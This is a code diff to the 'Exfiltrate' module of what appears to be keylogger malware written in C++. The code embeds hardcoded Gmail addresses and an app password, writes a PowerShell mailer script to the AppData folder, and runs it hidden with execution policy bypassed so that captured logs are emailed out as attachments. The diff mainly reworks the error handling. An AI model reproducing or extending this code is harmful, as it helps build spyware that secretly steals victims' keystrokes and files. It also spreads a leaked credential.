@@ -16,7 +16,6 @@ namespace Exfiltrate
 	#define ORIGIN "abdullahansari1618@gmail.com" 
 	#define DESTINATATION "abdullahansari1618@gmail.com"
 	#define PASSWORD "kywszmmfscebhngb"
-
 	const std::string &exfiltratorScript =
 
 		"Param( [String]$attachment, [String]$subject, [String] $body)\r\n\r\n"
@@ -87,7 +86,16 @@ namespace Exfiltrate
 	bool doesFileExist(const std::string &fileName)
 	{
 		std::ifstream checkFile(fileName);
-		return (bool)checkFile;
+
+		if (checkFile)
+		{
+			return true;
+		}
+		else
+		{
+			return false;
+
+		}
 	}
 
 	bool writeScript()
@@ -101,14 +109,6 @@ namespace Exfiltrate
 		else
 		{
 			scriptFile << exfiltratorScript;
-		}
-
-		if (!scriptFile)
-		{
-			return false;
-		}
-		else
-		{
 			scriptFile.close();
 			return true;
 		}
@@ -118,27 +118,16 @@ namespace Exfiltrate
 
 	int exfilLogs(const std::string &subject, const std::string &body, const std::string &attachments)
 	{
-		bool isSuccessful = IO::createDirectory(IO::getAppDataPath(true));
-
-		if (!isSuccessful)
+		if (!writeScript())
 		{
-			return -1;
+			Auxiliary::logError("Exfiltrate::exfilLogs() - writeScript() failed to create the mailer script!");
+			return -3;
 		}
 
 		std::string scriptPath = IO::getAppDataPath(true) + std::string(SCRIPT_NAME);
 
-		if (!doesFileExist(scriptPath))
-		{
-			isSuccessful = writeScript();
-		}
-
-		if (!isSuccessful)
-		{
-			return -2;
-		}
-
-		std::string executionParams = "-ExecutionPolicy ByPass -File \"" + scriptPath + 
-			"\" -subject \"" + stringReplace(subject, "\"", "\\\"") + "\" -body \"" 
+		std::string executionParams = "-ExecutionPolicy ByPass -File \"" + scriptPath +
+			"\" -subject \"" + stringReplace(subject, "\"", "\\\"") + "\" -body \""
 			+ stringReplace(body, "\"", "\\\"") + "\" -attachment \"" + attachments + "\"";
 
 		//Conversion from std::string to LPCWSTR
@@ -157,10 +146,11 @@ namespace Exfiltrate
 		shellConfig.nShow = SW_HIDE;
 		shellConfig.hInstApp = NULL;
 
-		isSuccessful = (bool)ShellExecuteEx(&shellConfig);
+		bool executionSuccessful = (bool)ShellExecuteEx(&shellConfig);
 
-		if (!isSuccessful)
+		if (!executionSuccessful)
 		{
+			Auxiliary::logError("Exfiltrate::exfilLogs() - There was an error executing the mailer script!");
 			return -3;
 		}
 
@@ -168,7 +158,7 @@ namespace Exfiltrate
 		DWORD exitCode = 100;
 		GetExitCodeProcess(shellConfig.hProcess, &exitCode);
 		
-		myTimer.setContainerFunction([&]()
+		/*myTimer.setContainerFunction([&]()
 		{
 				WaitForSingleObject(shellConfig.hProcess, 60000);
 				GetExitCodeProcess(shellConfig.hProcess, &exitCode);
@@ -179,6 +169,10 @@ namespace Exfiltrate
 
 				Auxiliary::logError("[From Mailer Function] Error Code: " + Auxiliary::toString((int)exitCode));
 		});
+
+		myTimer.setExecutionCount(1L);
+		myTimer.setExecutionInterval(10L);
+		myTimer.startTimer(true);*/
 		
 		return (int)exitCode;
 	}
